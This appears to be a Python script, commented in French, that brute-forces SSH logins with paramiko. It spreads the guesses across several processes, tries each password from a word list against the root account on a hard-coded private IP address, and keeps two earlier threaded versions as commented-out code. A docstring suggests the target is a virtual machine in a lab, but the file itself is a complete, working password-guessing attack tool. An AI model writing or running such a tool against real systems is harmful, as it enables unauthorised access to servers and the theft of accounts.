import threading, time, datetime, paramiko
from wordlist import create_wordlist
import multiprocessing


# def brute_force_ssh_thread(hostname, port, username, password_list):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#     # Tester chaque mot de passe dans la liste
#     for password in password_list:
#         try:
#             client.connect(hostname=hostname, port=port, username=username, password=password)
#             print(f"Mot de passe trouvé: {password}")
#             client.close()
#             return password
#         except:
#             client.close()
#             pass


# def brute_force_ssh(hostname, port, username, password_list, num_threads=2):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une liste de threads
#     threads = []
#     for i in range(num_threads):
#         t = threading.Thread(target=brute_force_ssh_thread, args=(hostname, port, username, password_list))
#         threads.append(t)
#         t.start()

#     # Attendre que tous les threads se terminent
#     for t in threads:
#         t.join()
















# def brute_force_ssh_thread(hostname, port, username, password_list, password_index):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
#     """
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#     # Tester chaque mot de passe dans la liste
#     try:
#         password = password_list[password_index]
#         print(f"Trying: {password}")
#         client.connect(hostname=hostname, port=port, username=username, password=password)
#         print(f"Mot de passe trouvé: {password}")
#         client.close()
#         return password
#     except:
#         client.close()
#         pass


# def brute_force_ssh(hostname, port, username, password_list, num_threads=2):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
#     Utilise le multithreading pour accélérer le processus.
#     """
#     # Créer une liste de threads
#     threads = []
#     for i in range(num_threads):
#         # Diviser la liste de mots de passe en deux
#         start_index = i * (len(password_list) // num_threads)
#         end_index = (i + 1) * (len(password_list) // num_threads)
#         if i == num_threads - 1:
#             end_index = len(password_list)

#         # Créer le thread avec la sous-liste de mots de passe
#         t = threading.Thread(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, start_index))
#         threads.append(t)
#         t.start()

#     # Attendre que tous les threads se terminent
#     for t in threads:
#         t.join()






def brute_force_ssh_thread(hostname, port, username, password_list, next_password_index):
    """
    Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    while True:
        # Récupérer l'index du prochain mot de passe à tester
        with next_password_index.get_lock():
            i = next_password_index.value
            # Si tous les mots de passe ont été testés, le thread se termine
            if i >= len(password_list):
                client.close()
                return
            # Mettre à jour l'index pour le thread suivant
            next_password_index.value += 1

        password = password_list[i]
        try:
            client.connect(hostname=hostname, port=port, username=username, password=password)
            print(f"Mot de passe trouvé: {password}")
            client.close()
            return password
        except:
            client.close()
            pass


def brute_force_ssh(hostname, port, username, password_list, num_threads=8):
    """
    Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
    Utilise le multithreading pour accélérer le processus.
    """
    # Créer une variable partagée pour l'index du prochain mot de passe à tester
    next_password_index = multiprocessing.Value('i', 0)

    # Créer les threads pour tester les mots de passe
    threads = []
    for i in range(num_threads):
        thread = multiprocessing.Process(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, next_password_index))
        thread.start()
        threads.append(thread)

    # Attendre que tous les threads se terminent
    for thread in threads:
        thread.join()



def main():

    wordlist = create_wordlist("passwords.txt")
    print(wordlist)


    brute_force_ssh("172.17.49.11", 22, "root", wordlist, 4)


if __name__ == '__main__':
    main()